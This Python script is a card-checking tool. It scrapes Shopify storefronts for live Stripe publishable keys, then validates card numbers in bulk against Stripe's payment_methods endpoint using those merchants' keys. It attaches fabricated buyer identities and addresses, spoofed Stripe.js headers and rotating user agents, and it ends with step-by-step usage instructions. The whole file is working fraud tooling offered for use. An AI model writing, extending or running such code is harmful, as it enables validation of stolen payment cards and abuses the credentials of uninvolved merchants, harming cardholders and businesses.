# Charge8_Shopify_Optimized.py - Optimized Shopify Checker for 15000+ stores
# Properly handles stores with/without Stripe, caches working stores

import requests
import re
import json
import random
import string
import time
import threading
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote_plus, urlencode, urlparse
from collections import deque

# --- Configuration ---
GATE_TIMEOUT = 8  # Seconds to wait for store response
STRIPE_TIMEOUT = 15  # Seconds for Stripe API
MAX_WORKING_CACHE = 1000  # Cache up to 1000 working stores
VALIDATION_THREADS = 100  # Threads for validating stores
CHECK_THREADS = 30  # Threads for checking cards

# --- Thread-safe store manager ---
class ShopifyStoreManager:
    """Manages Shopify stores with Stripe - validates and caches working ones"""
    
    def __init__(self):
        self.all_stores = []
        self.working_stores = []  # Stores with Stripe keys
        self.working_keys = {}  # Store URL -> Stripe PK mapping
        self.dead_stores = set()  # Stores without Stripe
        self.current_index = 0
        self.lock = threading.Lock()
        self.validated = False
        
    def load_stores(self, filepath):
        """Load stores from file"""
        try:
            with open(filepath, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        # Normalize URL
                        if not line.startswith('http'):
                            line = 'https://' + line
                        # Ensure it ends properly
                        if not line.endswith('/'):
                            line = line.rstrip('/') 
                        self.all_stores.append(line)
            print(f"[StoreManager] Loaded {len(self.all_stores)} stores")
        except Exception as e:
            print(f"[StoreManager] Error loading stores: {e}")
    
    def add_working_store(self, store_url, stripe_pk):
        """Add a validated working store"""
        with self.lock:
            if store_url not in self.working_keys:
                self.working_stores.append(store_url)
                self.working_keys[store_url] = stripe_pk
                if store_url in self.dead_stores:
                    self.dead_stores.discard(store_url)
    
    def mark_dead(self, store_url):
        """Mark a store as not having Stripe"""
        with self.lock:
            self.dead_stores.add(store_url)
    
    def get_next_store(self):
        """Get next working store (round-robin)"""
        with self.lock:
            if not self.working_stores:
                return None, None
            
            # Round-robin through working stores
            store = self.working_stores[self.current_index % len(self.working_stores)]
            pk = self.working_keys.get(store)
            self.current_index += 1
            
            return store, pk
    
    def get_random_store(self):
        """Get a random working store"""
        with self.lock:
            if not self.working_stores:
                return None, None
            
            store = random.choice(self.working_stores)
            pk = self.working_keys.get(store)
            return store, pk
    
    def get_stats(self):
        """Get statistics"""
        with self.lock:
            return {
                'total': len(self.all_stores),
                'working': len(self.working_stores),
                'dead': len(self.dead_stores),
                'untested': len(self.all_stores) - len(self.working_stores) - len(self.dead_stores)
            }
    
    def save_working_stores(self, filepath):
        """Save working stores to file for reuse"""
        with self.lock:
            try:
                with open(filepath, 'w') as f:
                    for store in self.working_stores:
                        pk = self.working_keys.get(store, '')
                        f.write(f"{store}|{pk}\n")
                print(f"[StoreManager] Saved {len(self.working_stores)} working stores to {filepath}")
            except Exception as e:
                print(f"[StoreManager] Error saving: {e}")
    
    def load_working_stores(self, filepath):
        """Load pre-validated working stores"""
        try:
            with open(filepath, 'r') as f:
                for line in f:
                    line = line.strip()
                    if '|' in line:
                        parts = line.split('|')
                        store = parts[0]
                        pk = parts[1] if len(parts) > 1 else None
                        if pk:
                            self.working_stores.append(store)
                            self.working_keys[store] = pk
            self.validated = True
            print(f"[StoreManager] Loaded {len(self.working_stores)} pre-validated stores")
        except Exception as e:
            print(f"[StoreManager] Error loading working stores: {e}")

# Global store manager
_store_manager = None

def get_store_manager():
    global _store_manager
    if _store_manager is None:
        _store_manager = ShopifyStoreManager()
    return _store_manager

def init_store_manager(stores_file=None, working_file=None):
    """Initialize the store manager"""
    global _store_manager
    _store_manager = ShopifyStoreManager()
    
    if working_file and os.path.exists(working_file):
        _store_manager.load_working_stores(working_file)
    elif stores_file:
        _store_manager.load_stores(stores_file)
    
    return _store_manager

# --- Generation Functions ---
def generate_random_string(length, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(length))

def generate_first_name():
    names = ["Michael", "Christopher", "Jessica", "Matthew", "Ashley", "Jennifer", "Joshua", "Amanda", 
             "Daniel", "David", "James", "Robert", "John", "Joseph", "Andrew", "Ryan", "Brandon"]
    return random.choice(names)

def generate_last_name():
    names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", 
             "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson"]
    return random.choice(names)

def generate_email(first, last):
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]
    num = random.randint(100, 9999)
    return f"{first.lower()}.{last.lower()}{num}@{random.choice(domains)}"

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
]

# --- Store Validation ---
def validate_single_store(store_url):
    """
    Check if a Shopify store has Stripe integration.
    Returns (store_url, stripe_pk) if found, None otherwise.
    """
    try:
        session = requests.Session()
        session.headers.update({
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        })
        
        # Try multiple pages to find Stripe key
        pages_to_check = [
            store_url,
            f"{store_url}/checkout",
            f"{store_url}/cart",
        ]
        
        for page in pages_to_check:
            try:
                response = session.get(page, timeout=GATE_TIMEOUT, allow_redirects=True)
                
                if response.status_code == 200:
                    html = response.text
                    
                    # Look for Stripe publishable key
                    pk_patterns = [
                        r'pk_live_[A-Za-z0-9]{20,}',
                        r'"publishableKey"\s*:\s*"(pk_live_[^"]+)"',
                        r"Stripe\(['\"]?(pk_live_[^'\"]+)['\"]?\)",
                        r'data-stripe-publishable-key="(pk_live_[^"]+)"',
                    ]
                    
                    for pattern in pk_patterns:
                        match = re.search(pattern, html)
                        if match:
                            pk = match.group(1) if '(' in pattern or '"' in pattern else match.group(0)
                            if pk.startswith('pk_live_'):
                                return (store_url, pk)
                    
            except:
                continue
        
        return None
        
    except Exception as e:
        return None

def validate_stores_batch(stores, max_workers=VALIDATION_THREADS, progress_callback=None):
    """
    Validate multiple stores in parallel.
    Returns list of (store_url, stripe_pk) tuples for working stores.
    """
    working = []
    total = len(stores)
    checked = 0
    
    print(f"[Validator] Validating {total} stores with {max_workers} threads...")
    print(f"[Validator] Looking for stores with Stripe integration...")
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(validate_single_store, store): store for store in stores}
        
        for future in as_completed(futures):
            checked += 1
            store = futures[future]
            
            try:
                result = future.result()
                if result:
                    working.append(result)
                    store_manager = get_store_manager()
                    store_manager.add_working_store(result[0], result[1])
                    
                    if progress_callback:
                        progress_callback('found', result[0], result[1])
                else:
                    store_manager = get_store_manager()
                    store_manager.mark_dead(store)
                    
            except Exception as e:
                pass
            
            # Progress update
            if checked % 100 == 0 or checked == total:
                pct = (checked / total) * 100
                print(f"[Validator] Progress: {checked}/{total} ({pct:.1f}%) - Found {len(working)} with Stripe")
    
    print(f"[Validator] Complete: Found {len(working)}/{total} stores with Stripe")
    return working

# --- Card Checking ---
def check_card_with_store(ccx, store_url=None, stripe_pk=None):
    """
    Check a card using a Shopify store's Stripe integration.
    
    Args:
        ccx: Card in format "NUMBER|MM|YY|CVC"
        store_url: Shopify store URL (optional, will use manager if not provided)
        stripe_pk: Stripe publishable key (optional)
    
    Returns:
        str: Result message
    """
    # Get store if not provided
    if not store_url or not stripe_pk:
        store_manager = get_store_manager()
        store_url, stripe_pk = store_manager.get_next_store()
        
        if not store_url or not stripe_pk:
            return "Error: No working stores available"
    
    # Parse card
    try:
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) != 4:
            return "Error: Invalid card format"
        
        n, mm, yy, cvc = parts
        n = n.replace(' ', '')
        
        if not (n.isdigit() and mm.isdigit() and yy.isdigit() and cvc.isdigit()):
            return "Error: Card parts must be numeric"
        
        if len(yy) == 4 and yy.startswith("20"):
            yy = yy[2:]
        
        mm = mm.zfill(2)
        
    except Exception as e:
        return f"Error parsing card: {e}"
    
    # Generate user data
    first_name = generate_first_name()
    last_name = generate_last_name()
    email = generate_email(first_name, last_name)
    
    # US Address
    street = f"{random.randint(100, 9999)} Main Street"
    city = random.choice(["New York", "Los Angeles", "Chicago", "Houston"])
    state = random.choice(["NY", "CA", "IL", "TX"])
    postal = f"{random.randint(10000, 99999)}"
    
    # Create payment method via Stripe
    try:
        pm_url = 'https://api.stripe.com/v1/payment_methods'
        
        pm_headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'User-Agent': random.choice(USER_AGENTS),
        }
        
        pm_data = {
            'type': 'card',
            'billing_details[name]': f"{first_name} {last_name}",
            'billing_details[email]': email,
            'billing_details[address][line1]': street,
            'billing_details[address][city]': city,
            'billing_details[address][state]': state,
            'billing_details[address][postal_code]': postal,
            'billing_details[address][country]': 'US',
            'card[number]': n,
            'card[cvc]': cvc,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'guid': f"NA-{generate_random_string(36)}",
            'muid': f"NA-{generate_random_string(36)}",
            'sid': f"NA-{generate_random_string(36)}",
            'payment_user_agent': 'stripe.js/v3',
            'time_on_page': str(random.randint(30000, 90000)),
            'key': stripe_pk,
        }
        
        response = requests.post(pm_url, headers=pm_headers, 
                                data=urlencode(pm_data), timeout=STRIPE_TIMEOUT)
        
        domain = urlparse(store_url).netloc
        
        if response.status_code == 200:
            pm_json = response.json()
            pm_id = pm_json.get('id')
            
            if pm_id:
                card_brand = pm_json.get('card', {}).get('brand', 'Unknown').upper()
                last_4 = pm_json.get('card', {}).get('last4', n[-4:])
                return f"Approved | {card_brand} ****{last_4} | {domain}"
            else:
                return "Error: No PM ID"
                
        elif response.status_code == 402:
            # Card declined - parse error
            try:
                error_json = response.json()
                error = error_json.get('error', {})
                msg = error.get('message', 'Declined')
                code = error.get('decline_code', error.get('code', ''))
                
                # Common decline reasons
                if 'insufficient_funds' in msg.lower() or code == 'insufficient_funds':
                    return "Insufficient funds."
                elif 'incorrect_cvc' in msg.lower() or code == 'incorrect_cvc':
                    return "Your card's security code is incorrect."
                elif 'expired' in msg.lower() or code == 'expired_card':
                    return "Your card has expired."
                elif 'incorrect_number' in msg.lower() or code == 'incorrect_number':
                    return "Your card number is incorrect."
                elif code == 'card_declined':
                    return "Your card was declined."
                elif code == 'do_not_honor':
                    return "Declined (Do Not Honor)"
                elif code == 'lost_card':
                    return "Declined (Lost Card)"
                elif code == 'stolen_card':
                    return "Declined (Stolen Card)"
                else:
                    return f"Declined ({msg[:50]})"
            except:
                return "Your card was declined."
                
        elif response.status_code == 401:
            # Key invalid - mark store as dead
            store_manager = get_store_manager()
            store_manager.mark_dead(store_url)
            return "Error: Store key invalid"
            
        else:
            return f"Error: Stripe HTTP {response.status_code}"
            
    except requests.exceptions.Timeout:
        return "Error: Stripe timeout"
    except Exception as e:
        return f"Error: {str(e)[:30]}"

def check_cards_batch(cards, threads=CHECK_THREADS, callback=None):
    """
    Check multiple cards using the store manager.
    
    Args:
        cards: List of card strings
        threads: Number of parallel threads
        callback: Function(card, result) called for each result
    
    Returns:
        dict: Results summary
    """
    results = {
        'approved': [],
        'declined': [],
        'errors': [],
    }
    
    store_manager = get_store_manager()
    stats = store_manager.get_stats()
    
    if stats['working'] == 0:
        print("[Checker] Error: No working stores available!")
        print("[Checker] Run validation first: validate_stores_batch(stores)")
        return results
    
    print(f"[Checker] Using {stats['working']} working stores")
    print(f"[Checker] Checking {len(cards)} cards with {threads} threads...")
    
    total = len(cards)
    checked = 0
    lock = threading.Lock()
    
    def check_single(card):
        nonlocal checked
        result = check_card_with_store(card)
        
        with lock:
            checked += 1
            
            result_lower = result.lower()
            if 'approved' in result_lower or 'charged' in result_lower:
                results['approved'].append((card, result))
            elif 'error' in result_lower:
                results['errors'].append((card, result))
            else:
                results['declined'].append((card, result))
            
            if callback:
                callback(card, result, checked, total)
        
        return (card, result)
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(check_single, card) for card in cards]
        
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                pass
    
    print(f"[Checker] Complete: ✅{len(results['approved'])} ❌{len(results['declined'])} ⚠️{len(results['errors'])}")
    return results

# Alias
ShopifyOptimizedCheckout = check_card_with_store

# --- Example Usage ---
if __name__ == "__main__":
    print("="*60)
    print("SHOPIFY OPTIMIZED CHECKER")
    print("="*60)
    print()
    print("Usage:")
    print("1. Initialize store manager:")
    print("   sm = init_store_manager(stores_file='stores.txt')")
    print()
    print("2. Validate stores (find ones with Stripe):")
    print("   working = validate_stores_batch(sm.all_stores[:1000])")
    print()
    print("3. Save working stores for reuse:")
    print("   sm.save_working_stores('working_stores.txt')")
    print()
    print("4. Check cards:")
    print("   results = check_cards_batch(cards)")
    print()
    print("Or load pre-validated stores:")
    print("   sm = init_store_manager(working_file='working_stores.txt')")
